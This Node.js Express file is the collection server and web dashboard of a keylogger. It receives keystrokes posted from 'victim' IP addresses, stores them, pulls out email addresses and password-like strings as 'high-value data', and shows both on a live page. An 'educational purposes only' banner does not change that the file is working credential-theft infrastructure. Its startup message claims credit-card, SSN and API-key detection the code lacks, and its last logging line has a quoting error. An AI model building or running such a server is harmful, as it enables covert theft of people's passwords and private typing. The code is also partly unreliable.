const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");

const app = express();
app.use(bodyParser.json({ extended: true }));

const port = 8080;
const connectedDevices = new Map();
const flaggedValueHashes = new Set();

function sanitizeText(text) {
    if (!text) return "";
    let cleaned = text.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, "");
    cleaned = cleaned.replace(/\\x[0-9a-fA-F]{2}/g, "");
    cleaned = cleaned.replace(/\bKey\.[a-zA-Z.]+\b/g, "");
    cleaned = cleaned.replace(/(Key\.(up|down|left|right|cmd)\s*)+/gi, "");
    cleaned = cleaned.replace(/\bKey\b/g, "");
    return cleaned;
}

const stoplist = new Set([
    "and", "but", "please", "string", "this", "that", "with", "from", "have", "will",
    "would", "could", "should", "about", "which", "what", "when", "where", "who", "why",
    "how", "then", "than", "there", "their", "they", "them", "these", "those", "some",
    "such", "into", "upon", "also", "only", "just", "very", "well", "back", "after",
    "before", "over", "under", "between", "through", "during", "without", "within",
    "along", "following", "including", "according", "login", "log", "facebook", "google",
    "twitter", "search", "test", "loogin", "password", "pass", "pwd", "faceboo", "akmal"
]);

function extractEmails(text) {
    const emailRegex = /([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.(?:com|net|org|edu|gov|io|co|uk|de|fr|jp|cn|ru|br|in|au|ca|mx|es|it|nl|se|no|pl|kr|za|nz))/gi;
    const emails = [];
    let match;
    while ((match = emailRegex.exec(text)) !== null) {
        emails.push({ full: match[1], index: match.index, end: match.index + match[1].length });
    }
    return emails;
}

function splitIntoTokens(text) {
    const allowedChars = /[A-Za-z0-9!@#$%^&*()_+\-=\[\]{};:'"\\|,.<>?/~`]+/g;
    const tokens = [];
    let match;
    while ((match = allowedChars.exec(text)) !== null) {
        tokens.push(match[0]);
    }
    return tokens;
}

function isPasswordLike(token) {
    if (token.length < 4 || token.length > 40) return false;
    if (stoplist.has(token.toLowerCase())) return false;
    if (/[0-9!@#$%^&*()_+\-=\[\]{};:'"\\|,.<>?/~`]/.test(token)) {
        if (!/^[A-Za-z]+$/.test(token)) return true;
    }
    return false;
}

function detectPatterns(rawText) {
    const text = sanitizeText(rawText);
    const matches = [];

    const emails = extractEmails(text);
    let remainingText = text;
    for (let i = emails.length - 1; i >= 0; i--) {
        const email = emails[i];
        matches.push({ rule: "EMAIL", matched: email.full, description: "Email address" });
        remainingText = remainingText.slice(0, email.index) + remainingText.slice(email.end);
    }

    const tokens = splitIntoTokens(remainingText);
    for (const token of tokens) {
        if (isPasswordLike(token)) {
            matches.push({ rule: "PASSWORD_DETECTED", matched: token, description: "Potential password" });
        }
    }

    const keywordRegex = /(?:password|passwd|pwd)\s*[:=]?\s*(?:is|are)?\s*([^\s]{4,})/gi;
    let kwMatch;
    while ((kwMatch = keywordRegex.exec(text)) !== null) {
        let pwd = kwMatch[1];
        if (pwd.length >= 4 && pwd.length <= 40 && isPasswordLike(pwd)) {
            if (!matches.some(m => m.matched === pwd)) {
                matches.push({ rule: "PASSWORD", matched: pwd, description: "Password (keyword)" });
            }
        }
    }

    const unique = new Map();
    for (const m of matches) {
        const key = `${m.rule}:${m.matched}`;
        if (!unique.has(key)) unique.set(key, m);
    }
    return Array.from(unique.values());
}

function getSensitiveHash(ip, matches) {
    const items = matches.map(m => `${m.rule}:${m.matched}`).sort().join("|");
    return `${ip}:${items}`;
}

function logFlaggedEventIfNew(victimIp, deviceInfo, matches) {
    if (matches.length === 0) return false;
    const hashKey = getSensitiveHash(victimIp, matches);
    if (flaggedValueHashes.has(hashKey)) return false;
    flaggedValueHashes.add(hashKey);

    const timestamp = new Date().toISOString();
    let flagEntry = `\n[${timestamp}] | IP: ${victimIp}\n`;
    flagEntry += `Device: ${deviceInfo}\n`;
    flagEntry += `Detected:\n`;
    matches.forEach(m => {
        flagEntry += `  - ${m.rule}: "${m.matched}" (${m.description})\n`;
    });
    flagEntry += `-`.repeat(60) + "\n";

    fs.appendFileSync("flagged_capture.txt", flagEntry);
    console.log(`\n[FLAGGED EVENT] ${victimIp} | ${matches.map(m => `${m.rule}=${m.matched}`).join(", ")}`);
    return true;
}

app.get("/api/status", (req, res) => res.json({ status: "alive", timestamp: Date.now() }));

app.get("/api/logs", (req, res) => {
    try {
        let data = fs.readFileSync("./keyboard_capture.txt", "utf8");
        data = sanitizeText(data);
        res.json({ logs: data, byteSize: Buffer.byteLength(data, "utf8"), lineCount: data.split("\n").length - 1 });
    } catch {
        res.json({ logs: "", byteSize: 0, lineCount: 0 });
    }
});

app.get("/api/flags", (req, res) => {
    try {
        const data = fs.readFileSync("./flagged_capture.txt", "utf8");
        const count = (data.match(/-{60}/g) || []).length;
        res.json({ flags: data, count });
    } catch {
        res.json({ flags: "No flagged events captured yet.", count: 0 });
    }
});

app.post("/api/clear", (req, res) => {
    try {
        fs.writeFileSync("keyboard_capture.txt", "");
        console.log("[*] Raw logs purged");
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

app.post("/api/clear-flags", (req, res) => {
    try {
        fs.writeFileSync("flagged_capture.txt", "");
        flaggedValueHashes.clear();
        console.log("[*] Flagged events purged");
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

app.get("/", (req, res) => {
    let initialLogs = "No records currently indexed in data buffer.";
    let initialBytes = 0, initialLines = 0, initialFlags = "Awaiting flagged activity...", flagCount = 0;
    try {
        let logs = fs.readFileSync("./keyboard_capture.txt", "utf8");
        logs = sanitizeText(logs);
        if (logs.trim()) {
            initialLogs = logs;
            initialBytes = Buffer.byteLength(logs, "utf8");
            initialLines = logs.split("\n").length - 1;
        }
    } catch {}
    try {
        const flags = fs.readFileSync("./flagged_capture.txt", "utf8");
        if (flags.trim()) {
            initialFlags = flags;
            flagCount = (flags.match(/-{60}/g) || []).length;
        }
    } catch {}

    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Keylogger Dashboard</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:#f6f8fa; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; padding:40px 24px; }
        .workspace { max-width:1400px; margin:0 auto; }
        .app-bar { display:flex; justify-content:space-between; align-items:flex-end; border-bottom:2px solid #d0d7de; padding-bottom:16px; margin-bottom:24px; }
        .main-heading { font-size:24px; font-weight:600; }
        .control-panel { display:flex; gap:16px; }
        button { background:#24292f; border:none; color:white; padding:6px 14px; border-radius:6px; cursor:pointer; }
        .telemetry-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:16px; margin-bottom:24px; }
        .metric-card { background:white; border:1px solid #d0d7de; border-radius:6px; padding:16px; }
        .metric-label { font-size:12px; color:#57606a; margin-bottom:4px; }
        .metric-value { font-size:18px; font-weight:600; display:flex; align-items:center; gap:6px; }
        .dot { width:8px; height:8px; border-radius:50%; }
        .dot.active { background:#1a7f37; }
        .dot.inactive { background:#cf222e; }
        .flag-canvas, .log-canvas { background:white; border:1px solid #d0d7de; border-radius:6px; padding:24px; margin-bottom:24px; }
        h2 { font-size:18px; color:#cf222e; border-left:4px solid #cf222e; padding-left:12px; margin-bottom:12px; }
        pre { font-family:'SF Mono', monospace; font-size:13px; white-space:pre-wrap; }
        .toast { position:fixed; bottom:20px; right:20px; background:#24292f; color:white; padding:10px 20px; border-radius:6px; opacity:0; transition:opacity 0.3s; }
    </style>
</head>
<body>
<div class="workspace">
    <div class="app-bar">
        <h1 class="main-heading">Keylogger Dashboard</h1>
        <div class="control-panel">
            <button onclick="purgeRaw()">Purge Raw Logs</button>
            <button onclick="clearFlagged()">Clear Flagged Events</button>
        </div>
    </div>
    <div class="telemetry-grid">
        <div class="metric-card"><div class="metric-label">Server Status</div><div class="metric-value"><span class="dot" id="statusDot"></span><span id="statusText">Checking...</span></div></div>
        <div class="metric-card"><div class="metric-label">Raw Buffer Payload</div><div class="metric-value" id="bytes">${initialBytes} Bytes</div></div>
        <div class="metric-card"><div class="metric-label">Raw Lines Captured</div><div class="metric-value" id="lines">${initialLines} Lines</div></div>
        <div class="metric-card"><div class="metric-label">Flagged Events (Unique)</div><div class="metric-value" id="flagCount">${flagCount}</div></div>
    </div>
    <div class="flag-canvas"><h2>FLAGGED HIGH-VALUE DATA</h2><pre id="flagStream">${initialFlags}</pre></div>
    <div class="log-canvas"><pre id="logStream">${initialLogs}</pre></div>
</div>
<div id="toast" class="toast"></div>
<script>
    const logEl = document.getElementById('logStream');
    const flagEl = document.getElementById('flagStream');
    const bytesEl = document.getElementById('bytes');
    const linesEl = document.getElementById('lines');
    const flagCountEl = document.getElementById('flagCount');
    const statusDot = document.getElementById('statusDot');
    const statusText = document.getElementById('statusText');
    const toast = document.getElementById('toast');

    function showMsg(msg, isErr=false) {
        toast.textContent = msg;
        toast.style.background = isErr ? '#cf222e' : '#1a7f37';
        toast.style.opacity = '1';
        setTimeout(() => toast.style.opacity = '0', 3000);
    }

    async function checkStatus() {
        try {
            const res = await fetch('/api/status');
            if (res.ok) {
                statusDot.className = 'dot active';
                statusText.innerText = 'ACTIVE';
                return true;
            } else throw new Error();
        } catch {
            statusDot.className = 'dot inactive';
            statusText.innerText = 'INACTIVE (server down)';
            return false;
        }
    }

    async function refresh() {
        const alive = await checkStatus();
        if (!alive) return;
        try {
            const logsRes = await fetch('/api/logs');
            if (logsRes.ok) {
                const d = await logsRes.json();
                bytesEl.innerText = d.byteSize + ' Bytes';
                linesEl.innerText = d.lineCount + ' Lines';
                logEl.innerText = d.logs.trim() || 'No records currently indexed in data buffer.';
            }
        } catch(e) {}
        try {
            const flagRes = await fetch('/api/flags');
            if (flagRes.ok) {
                const d = await flagRes.json();
                flagEl.innerText = d.flags || 'No flagged events yet.';
                flagCountEl.innerText = d.count || 0;
            }
        } catch(e) {}
    }

    async function purgeRaw() {
        if (!confirm('Delete all raw keystroke logs?')) return;
        const res = await fetch('/api/clear', { method:'POST' });
        const data = await res.json();
        if (data.success) { showMsg('Raw logs purged'); refresh(); }
        else showMsg('Failed: '+data.error, true);
    }
    async function clearFlagged() {
        if (!confirm('Delete all flagged events?')) return;
        const res = await fetch('/api/clear-flags', { method:'POST' });
        const data = await res.json();
        if (data.success) { showMsg('Flagged events cleared'); refresh(); }
        else showMsg('Failed: '+data.error, true);
    }
    setInterval(refresh, 2000);
    refresh();
</script>
</body>
</html>`);
});

app.post("/", (req, res) => {
    const victimIp = req.ip || req.socket.remoteAddress;
    const clientDevice = req.headers["user-agent"] || "Unknown";

    if (!connectedDevices.has(victimIp)) {
        connectedDevices.set(victimIp, clientDevice);
        console.log(`\n[+] NEW DEVICE: ${victimIp} | ${clientDevice}\n`);
    }

    let incomingText = req.body.keyboardData || "";
    incomingText = sanitizeText(incomingText);
    console.log(`[DATA from ${victimIp}]: ${incomingText.substring(0, 150)}`);

    fs.writeFileSync("keyboard_capture.txt", incomingText);

    const matches = detectPatterns(incomingText);
    if (matches.length > 0) {
        logFlaggedEventIfNew(victimIp, clientDevice, matches);
    }

    res.send("OK");
});

app.listen(port, () => {
    console.log(`\n     dBP dBP dBBBP dBP dBP dBP    dBBBBP dBBBBb  dBBBBb  dBBBP dBBBBBb
    dBP.d8P           dBP        dB'.BP                            dBP
   dBBBBP' dBBP      dBP dBP    dB'.BP dBBBB   dBBBB   dBBP    dBBBBK'
  dBP BB  dBP       dBP dBP    dB'.BP dB' BB  dB' BB  dBP     dBP  BB
 dBP dB' dBBBBP    dBP dBBBBP dBBBBP dBBBBBB dBBBBBB dBBBBP  dBP  dB'

                 .dBBBBP   dBP dBBBBBBb  dBP dBP dBP dBBBBBb  dBBBBBBP dBP dBBBBP dBBBBb
                 BP             '   dB'                   BB              dB'.BP     dBP
                 \`BBBBb  dBP dB'dB'dB' dBP dBP dBP    dBP BB   dBP   dBP dB'.BP dBP dBP
                    dBP dBP dB'dB'dB' dBP_dBP dBP    dBP  BB  dBP   dBP dB'.BP dBP dBP
               dBBBBP' dBP dB'dB'dB' dBBBBBP dBBBBP dBBBBBBB dBP   dBP dBBBBP dBP dBP

CREATED BY: DANISHLAID
REMINDER: FOR EDUCATIONAL PURPOSES ONLY\n`);
    console.log(`Server listening on port ${port}`);
    console.log("Rule-based pattern detection active: emails, passwords, credit cards, SSNs, API keys.");
    console.log("Duplicate prevention enabled.\n`);
});
